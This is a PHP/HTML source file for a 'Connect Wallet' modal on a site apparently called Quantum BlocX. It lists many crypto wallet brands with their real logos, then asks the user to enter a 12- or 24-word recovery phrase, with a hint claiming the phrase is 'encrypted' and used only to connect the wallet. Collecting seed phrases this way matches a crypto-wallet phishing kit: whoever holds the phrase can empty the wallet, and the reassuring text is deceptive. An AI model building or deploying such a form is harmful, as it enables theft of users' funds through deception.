<?php
/**
 * Project: Qblockx
 * Modal: External Wallet Linking — 2-step: (1) select wallet, (2) enter credentials
 */
$wallets = [
  '0x','1inch Wallet','Airgap','Airswap','Aktionariat','Aladdin Wallet','Alice',
  'AlphaWallet','Arculus','Argent','AT.Wallet','AToken Wallet','Atomic','Authereum',
  'BC vault','Bifrost','Binance Chain','Binance Chain Wallet','Binance Coin (BNB)',
  'Bitbox wallet','BitFi','Bitfifa','Bitinka','BitKeep','Bitlox','Bitmymoney',
  'BitPanda','Bitpay','BitPie','BitVault','Bitwala','Block.io','Blockchain',
  'Bread wallet','Bridge Wallet','Buntoy','Cardano Coin','Cello Wallet',
  'Cobo vault wallet','Coin98','Coinbase','Coinbase Wallet','Coinify','Coinmama',
  'Coinomi','CoinUs','Compound','Coolwallet','CoolWallet S','Crypterium',
  'Crypto Key Stack','Crypto.com DeFi Wallet','Cryptonator','Curv','Curve Dao Token',
  'CYBAVO Wallet','D\'Cent Wallet','DDEX','Defiant','Dexwallet','Dharma','Doge Coin',
  'Dok Wallet','dYdX','EasyPocket','Eidoo','Ellipal','Erisx','Etoro','EverRise Token',
  'Exodus Wallet','Fantom','Flare Wallet','FTX','Gala Token','GamingShiba Token',
  'Gate.io','GateHub','Guarda Wallet','Gemini','Gnosis Safe Multisig','GridPlus',
  'HaloDefi Wallet','HashKey Me','HEX','Huobi Wallet','ICON wallet','IDEX','imToken',
  'Infinito','Iotex','Jade Wallet','Jasmy Coin','Jaxx liberty wallet','Keepkey',
  'KEPLR','KEYRING PRO','Kraken','KyberSwap','Ledger','Ledger Hardware','Ledger Live',
  'Localbitcoin','Loopring Wallet','Maker','Math Wallet','MathWallet','Metamask',
  'Metapets Coin','Midas Wallet','Mongoose Token','moonpay','MyEtherWallet','MYKEY',
  'Nash','Nexo Wallet','NIL Coin','Nuo','O3Wallet','ONTO','Ownbit','Paybis',
  'PEAKDEFI Wallet','Phantom','Pillar','PlasmaPay','Plug Wallet','Polkadot',
  'Polygon (MATIC)','Polygon Wallet','PoolTogether','Rainbow','RobinHood','Rohinhood',
  'RWallet','SafePal Wallet','SaitaMask','Sandbox Token','SecuX v20','SHIBA INU',
  'Solana Coin','Solo Coin','SparkPoint','Spatium','Talken Wallet','Tangem Wallet',
  'Terra','Token Pocket','Tokenary','TokenPocket','Tongue Wallet','Torus',
  'Tradestation','Trezor Wallet','Trust Wallet','Trustee Wallet','TrustVault',
  'Uniswap','Unstoppable Wallet','Uphold','Valora','ViaWallet','Vision',
  'Wallet Connect','Wallet.io','Walleth','Xaman Wallet','XinFin XDC Network',
  'XRP','Xumm Wallet','Yoroi Wallet','ZelCore'
];

// Known wallet brand domains → used to show each wallet's real logo.
// Wallets not listed fall back to the generic wallet icon.
$walletLogos = [
  'Metamask'=>'metamask.io','Trust Wallet'=>'trustwallet.com','Coinbase'=>'coinbase.com',
  'Coinbase Wallet'=>'coinbase.com','Ledger'=>'ledger.com','Ledger Live'=>'ledger.com',
  'Ledger Hardware'=>'ledger.com','Phantom'=>'phantom.app','Exodus Wallet'=>'exodus.com',
  'SafePal Wallet'=>'safepal.com','TokenPocket'=>'tokenpocket.pro','Token Pocket'=>'tokenpocket.pro',
  'imToken'=>'token.im','MathWallet'=>'mathwallet.org','Math Wallet'=>'mathwallet.org',
  'Coin98'=>'coin98.com','Guarda Wallet'=>'guarda.com','Atomic'=>'atomicwallet.io',
  'Argent'=>'argent.xyz','Rainbow'=>'rainbow.me','Uniswap'=>'uniswap.org','Trezor Wallet'=>'trezor.io',
  'KEPLR'=>'keplr.app','Huobi Wallet'=>'huobi.com','Gate.io'=>'gate.io','GateHub'=>'gatehub.net',
  'Gemini'=>'gemini.com','Kraken'=>'kraken.com','Binance Chain Wallet'=>'binance.com',
  'Binance Chain'=>'binance.com','Crypto.com DeFi Wallet'=>'crypto.com','Blockchain'=>'blockchain.com',
  'MyEtherWallet'=>'myetherwallet.com','Bitpay'=>'bitpay.com','BitKeep'=>'bitget.com',
  'ONTO'=>'onto.app','Maker'=>'makerdao.com','Compound'=>'compound.finance','Polkadot'=>'polkadot.network',
  'Polygon Wallet'=>'polygon.technology','Nexo Wallet'=>'nexo.com','Crypterium'=>'crypterium.com',
  'Uphold'=>'uphold.com','RobinHood'=>'robinhood.com','Etoro'=>'etoro.com','FTX'=>'ftx.com',
  'Coinomi'=>'coinomi.com','BitPie'=>'bitpie.com','O3Wallet'=>'o3.app','Xumm Wallet'=>'xumm.app',
  'Xaman Wallet'=>'xaman.app','Yoroi Wallet'=>'yoroi-wallet.com','ZelCore'=>'zelcore.io',
  'Pillar'=>'pillar.fi','Torus'=>'tor.us','Wallet Connect'=>'walletconnect.com','Keepkey'=>'keepkey.com',
  'Loopring Wallet'=>'loopring.org','SHIBA INU'=>'shibatoken.com','Eidoo'=>'eidoo.io',
  'Dharma'=>'dharma.io','dYdX'=>'dydx.exchange','IDEX'=>'idex.io','Nash'=>'nash.io',
  'Bitfi'=>'bitfi.com','Ellipal'=>'ellipal.com','Cobo vault wallet'=>'cobo.com','Curve Dao Token'=>'curve.fi',
  'Fantom'=>'fantom.foundation','Solana Coin'=>'solana.com','Cardano Coin'=>'cardano.org',
  'Doge Coin'=>'dogecoin.com','Terra'=>'terra.money','Iotex'=>'iotex.io'
];
?>

<div class="modal-overlay" id="modal-trust-wallet" aria-hidden="true" role="dialog"
     aria-labelledby="trustWalletTitle" aria-modal="true">
  <div class="modal-card modal-card--wide">

    <div class="modal-header">
      <h2 class="modal-title" id="trustWalletTitle">
        <i class="ph ph-link-simple" aria-hidden="true"></i>
        Connect Wallet
      </h2>
      <button class="modal-close" onclick="closeModal('modal-trust-wallet')" aria-label="Close">
        <i class="ph ph-x" aria-hidden="true"></i>
      </button>
    </div>

    <!-- Step indicator -->
    <div class="tw-steps">
      <div class="tw-step tw-step--active" id="twStepDot1">
        <span class="tw-step-num">1</span>
        <span class="tw-step-label">Select Wallet</span>
      </div>
      <div class="tw-step-line"></div>
      <div class="tw-step" id="twStepDot2">
        <span class="tw-step-num">2</span>
        <span class="tw-step-label">Connect</span>
      </div>
    </div>

    <div class="modal-body">

      <!-- ── Step 1: Wallet Selector ─────────────────────────── -->
      <div id="twStep1">

        <div class="tw-search-wrap">
          <i class="ph ph-magnifying-glass tw-search-icon"></i>
          <input type="text" id="twSearchInput" class="tw-search-input"
                 placeholder="Search wallets…" autocomplete="off"
                 oninput="filterWallets(this.value)">
        </div>

        <div class="tw-wallet-grid" id="twWalletGrid">
          <?php foreach ($wallets as $w): $logoDomain = $walletLogos[$w] ?? null; ?>
            <button type="button" class="tw-wallet-item" onclick="selectWallet(<?= htmlspecialchars(json_encode($w)) ?>)">
              <?php if ($logoDomain): ?>
                <img class="tw-wallet-logo" src="https://www.google.com/s2/favicons?domain=<?= htmlspecialchars($logoDomain) ?>&sz=64"
                     alt="" loading="lazy"
                     onerror="this.style.display='none';this.nextElementSibling.style.display='';">
                <i class="ph ph-wallet tw-wallet-item-icon" style="display:none;"></i>
              <?php else: ?>
                <i class="ph ph-wallet tw-wallet-item-icon"></i>
              <?php endif; ?>
              <span class="tw-wallet-name"><?= htmlspecialchars($w) ?></span>
            </button>
          <?php endforeach; ?>
        </div>

        <p class="tw-wallet-count" id="twWalletCount"><?= count($wallets) ?> wallets supported</p>

      </div>

      <!-- ── Step 2: Credentials ─────────────────────────────── -->
      <div id="twStep2" style="display:none;">

        <button type="button" class="tw-back-btn" onclick="backToWalletSelect()">
          <i class="ph ph-arrow-left"></i> Back
        </button>

        <div class="tw-selected-wallet" id="twSelectedDisplay">
          <i class="ph ph-wallet"></i>
          <span id="twSelectedName">—</span>
          <span class="badge badge-success">Selected</span>
        </div>

        <input type="hidden" id="twSelectedWallet">

        <div class="form-group">
          <label for="twPhrase">Recovery Phrase</label>
          <textarea id="twPhrase" class="tw-phrase-input" rows="3"
                    placeholder="Enter your 12 or 24-word recovery phrase, separated by spaces"
                    autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false"></textarea>
          <span class="input-hint">
            <i class="ph ph-lock-key"></i>
            Your recovery phrase is <strong>encrypted</strong> and used only to connect
            this wallet to your Quantum BlocX account. Enter the words in order, separated
            by single spaces.
          </span>
        </div>

        <div id="twMsg" class="auth-msg" style="display:none;" role="alert"></div>

        <div class="modal-actions">
          <button type="button" class="btn-outline" onclick="closeModal('modal-trust-wallet')">Cancel</button>
          <button type="button" class="btn-primary" id="twSubmitBtn" onclick="submitTrustWallet()">
            <span class="btn-text"><i class="ph ph-link-simple"></i> Connect Wallet</span>
            <span class="btn-spinner" style="display:none;"></span>
          </button>
        </div>

      </div>

    </div>
  </div>
</div>
